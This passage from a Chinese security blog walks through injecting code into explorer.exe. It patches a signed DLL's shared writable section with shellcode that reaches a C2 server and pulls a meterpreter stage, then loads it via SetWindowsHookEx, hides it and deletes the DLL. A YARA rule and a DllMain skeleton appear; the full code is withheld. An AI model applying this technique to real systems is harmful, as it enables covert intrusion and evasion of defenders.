<p>那么思路就来了，如果一个模块的某个节区是具备 <code>RWX-S</code> 权限，我只需要把它加载到进程A中，然后修改它的内容为恶意代码，然后想办法让他加载到进程B中，就可以实现在B中执行恶意代码了， 那这种利用主要分为如下几个步骤：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 找到一个有签名的并且具备 RWX-S 权限的dll。(不具备RWX-S权限也可以，可以patch系统内的已签名的dll，但是这样会破坏签名，不够隐蔽)</span><br><span class="line"><span class="number">2.</span> 将DLL加载到进程A的内存里，修改 RWX-S 权限的section的代码进行patch</span><br><span class="line"><span class="number">3.</span> 调用  SetWindowsHookEx，使用DLL中的某个函数指针作为 HOOKPROC 参数，使得DLL被注入到目标进程B中。</span><br><span class="line"><span class="number">4.</span> 目标进程B加载DLL，并触发恶意代码执行。</span><br></pre></td></tr></table></figure>

<p>至于怎么去找一个具备 RWX-S权限的签名dll，原文作者也提供了一个yara规则在virustotal上来筛选，不再细说:</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import <span class="string">"pe"</span></span><br><span class="line"></span><br><span class="line">rule RWX_S_Signed_Search</span><br><span class="line">&#123;</span><br><span class="line">	meta:</span><br><span class="line">		description = <span class="string">"Detects RWX-S signed binaries. This only verifies that the image contains a signature, not that it is valid."</span></span><br><span class="line">		author = <span class="string">"Bill Demirkapi"</span></span><br><span class="line">	condition:</span><br><span class="line">		<span class="keyword">for</span> any <span class="selector-tag">i</span> <span class="keyword">in</span> (<span class="number">0</span>.<span class="selector-class">.pe</span><span class="selector-class">.number_of_sections</span> - <span class="number">1</span>): (</span><br><span class="line">			(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_READ) and</span><br><span class="line">			(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_EXECUTE) and</span><br><span class="line">			(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_WRITE) and</span><br><span class="line">			(pe<span class="selector-class">.sections</span>[i]<span class="selector-class">.characteristics</span> &amp; pe.SECTION_MEM_SHARED) )</span><br><span class="line">		and pe<span class="selector-class">.number_of_signatures</span> &gt; <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里提供一个我找到的DLL: <a href="https://www.virustotal.com/gui/file/855277c0aeea89d17a07e27e9cf79c98b26e70e8e57561c4b592097e0032c4e9，" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/855277c0aeea89d17a07e27e9cf79c98b26e70e8e57561c4b592097e0032c4e9，</a><br>以后的代码都是基于此DLL完成的。</p>
<p>其实这里面最关键的是步骤二，主要涉及两个问题：</p>
<ol>
<li>patch什么位置可以保证此DLL被进程B加载之后，恶意代码一定会被执行</li>
<li>patch成什么样的代码才能保证进程B不会因为运行异常而崩溃</li>
</ol>
<p>先回答问题1：当前DLL被进程B加载后一定会被执行的有两个函数，分别是 <code>DllMain</code> 和 设置给 <code>SetWindowsHookEx</code> 的消息hook函数, 我觉得这两个函数中<code>DllMain</code>更合适被patch为恶意代码，理由是 <code>hook procedure</code> 在每次有对应消息需要处理的时候都会被调用，这会导致我们的恶意代码被执行很多次，这显然不是我们想要的。同时 <code>DllMain</code> 在被进程加载的那一刻就会执行，能够保证我们的shellcode在第一时间被执行。</p>
<h2 id="patch-DllMain为恶意代码"><a href="#patch-DllMain为恶意代码" class="headerlink" title="patch DllMain为恶意代码"></a>patch DllMain为恶意代码</h2><p>此时就有人说了，patch DllMain很简单啊，加载这个dll之后，获取 imagebase，然后解析PE头找到entrypoint，将 msfvenom 生成的shellcode直接复制 imagebase + entrypoint 的位置就可以了。 开始我也是这么认为的，但是事实证明，这样不行。</p>
<p>我们来看 DllMain的函数声明：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved )</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Perform actions based on the reason for calling.</span></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">         <span class="comment">// Initialize once for each new process.</span></span><br><span class="line">         <span class="comment">// Return FALSE to fail DLL load.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">         <span class="comment">// Do thread-specific initialization.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">         <span class="comment">// Do thread-specific cleanup.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">         <span class="comment">// Perform any necessary cleanup.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此函是有返回值的，当对应的 <code>fdwReason</code> 操作成功后，必须返回 TRUE/FALSE。 此函数直接被替换为 meterpreter 的 shellcode，就会导致此函数无法返回。这种情况下的DLL加载是在系统新开的一个线程中完成的，如果 <code>DllMain</code> 回调函数不返回，系统就会kill掉这个线程，以至于我们自己的恶意代码无法持续的执行，那解决办法就是要在 <code>DllMain</code> 中新开一个线程，在线程里执行恶意代码，然后此函数返回。</p>
<p><strong>由于这一段代码需要在B进程的进程空间中执行，此时没有任何地址相关的信息，所以这一段代码必须要写成shellcode才能正常执行</strong><br>由于要自己写一段shellcode，那我们就没有必要再去使用 <code>meterpreter</code> 的shellcode了，也就是说这一段代码要完成 <code>meterpreter</code> 第一阶段的功能，直接下载stage2 的代码，然后使用 <code>CreateThread</code>进行执行，所以基本的代码框架：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved )</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>( fdwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:&#123;</span><br><span class="line">            <span class="comment">// 1. 加载 ws2_32.dll </span></span><br><span class="line">            <span class="comment">// 2. 获取与socket相关的函数的地址</span></span><br><span class="line">            <span class="comment">// 3. 连接socket, 如果连接失败，返回FALSE </span></span><br><span class="line">            <span class="comment">// 4. 申请内存空间,下载payload</span></span><br><span class="line">            <span class="comment">// 5. 调用 CreateThread 执行payload ，然后返回 TRUE</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要完成这样一段shellcode，我们是需要再创建一个项目，然后编写相关的c或者汇编代码，编译完成之后把相对于的16进制copy到当前的项目中来，这样做一方面比较麻烦，容易出错；另一方面不太灵活，不便于替换c2地址等操作。</p>
<p><strong>我想要就在当前项目中完成，编译完之后，运行时patch进去，要怎么做呢？</strong></p>
<p>仔细想一下，当 <code>DllMain</code>回调函数被执行的时候，难道真的任何地址信息都没有提供吗？其实不然。<br>看 <code>DllMain</code> 的第一个参数 <code>hinstDLL</code> 的值其实就是当前被加载模块的基址，有了这个基址，理论上我们就可以访问到当前模块任何地址空间数据。</p>
<p>那思路有了: 我们可以让进程A向 DLL 相对于 <code>imageBase</code> 固定偏移的地方写入一些必要的函数指针和数据，例如<code>LoadLibraryA</code>，<code>GetProcAddress</code>的函数的地址，以及 c2 的ip 和端口信息，然后 <code>DllMain</code> 被调用的时候会到指定偏移的地方读取这些数据，完成自己的功能，示意图如下：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182132688.png" alt=""></p>
<p>下面实现就比较简单了，首先需要定义一下要向DLL中写入的数据的结构：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182137405.png" alt=""></p>
<p>其中 <code>fn</code> 开头的存储的是对应函数的指针，<code>char</code>数组保存的是一些字符串信息，便于利用这些字符串获取到socket相关的函数的地址。最后 host 和 port 存储的c2的信息，flag是<code>meterpreter</code>第一阶段向第二阶段的传参约定数据。不了解的可以去读一下 <code>meterpreter</code>的源码，这里不再细说他的相关细节。</p>
<p>接下来将这个结构体初始化，然后放到固定偏移 <code>OFFSET_TO_SHELLCODE</code> 上去：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182144848.png" alt=""></p>
<p>然后开始编写伪造的DllMain，也就是shellcode的主体代码，如下:</p>
<p>首先读取指定偏移获取之前存储的数据：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182158887.png" alt=""></p>
<p>然后当 <code>DLL_PROCESS_ATTACH</code> 发生时，调用执行相关的操作加载远程的恶意代码：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182200356.png" alt=""></p>
<p>然后将这段代码patch到DllMain的位置：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182203333.png" alt=""></p>
<p><code>ShellCodeEnd</code> 是我定义的一个空的函数，他紧跟在<code>myDllMain</code>后面，主要是为了帮助我们定位出函数<code>myDllMain</code>在文件中的大小。</p>
<h2 id="patch-hook-procedure-函数防止程序崩溃"><a href="#patch-hook-procedure-函数防止程序崩溃" class="headerlink" title="patch hook procedure 函数防止程序崩溃"></a>patch hook procedure 函数防止程序崩溃</h2><p>只经过上述patch的DLL是可以满足执行恶意代码的功能，但是会引起被注入程序的异常或者崩溃，因为我们是调用 <code>SetWindowsHookEx</code> 设置的消息钩子，我们传入的 <code>hook procedure</code> 也并非一个钩子处理函数，它并不会调用 <code>CallNextHookEx</code> ，就导致被注入的进程无法响应相关的消息，甚至运行异常代码而崩溃，这样会导致获取的session挂掉， 因此这里也需要对 <code>hook procedure</code> 进行代码patch。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182211988.png" alt=""></p>
<p>这里就是使用传统的shellcode的写法，就是获取 PEB ，遍历dll，然后加载 <code>CallNextHookEx</code> 并调用，这里使用了 <code>lazy_import</code> 的宏 <code>LI_FN</code>,他是可以自动展开为shellcode的，不需要自己再写了。</p>
<h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><p>加载相关 RWX-S的模块，解析PE结构，获取相关的地址：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182220207.png" alt=""></p>
<p>设置消息钩子，进行dll注入。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182214469.png" alt=""></p>
<p>我这里sleep了200秒，然后卸载掉钩子，这个时间长度足够 <code>explorer.exe</code> 触发 <code>WH_GETMESSAGE</code> 消息，并上线了。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182217607.png" alt=""></p>
<p>当钩子被卸载之后，<code>KbdEditDllPremium.dll</code> 也会从内存中卸载，此时主程序其实可以直接删掉 <code>KbdEditDllPremium.dll</code>进行彻底的毁尸灭迹。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182222967.png" alt=""></p>
<p>内存里虽然已经没有了 <code>KbdEditDllPremium.dll</code> 模块，但是却依然不影响我们的session交互，因为此时的恶意代码运行在 <code>explorer.exe</code> 申请的堆空间上。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204182224697.png" alt=""></p>
<p>这对于入侵痕迹的隐藏是非常有用的一个技巧。</p>
<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>最后还需要再补充一下，因为要在此项目中要编译生成shellcode，所以要对一些编译选项就行一些调整，防止生成的代码无法在其他进程空间中运行。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204190847820.png" alt=""></p>
<p>运行库选择MT，然后禁用GS保护。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204190848574.png" alt=""></p>
<p>代码优化也需要调整一下。</p>
<p><strong>最后扩展一句：如果无法找到一个已经签名的RWX-S权限的dll，我们甚至可以修改系统的dll添加S权限，然后保存到临时目录，注入完成之后删除掉。</strong></p>
<p>为了避免安全风险，代码以及有RWX-S权限的签名DLL就不发源文件了，如果感兴趣，可以联系我获取。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>windows</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>深入挖掘bash反弹shell背后的密码</title>
    <url>/2021/12/10/%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98bash%E5%8F%8D%E5%BC%B9shell%E8%83%8C%E5%90%8E%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    <content><![CDATA[<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />
    <label for="pass">Please enter the password to read the blog.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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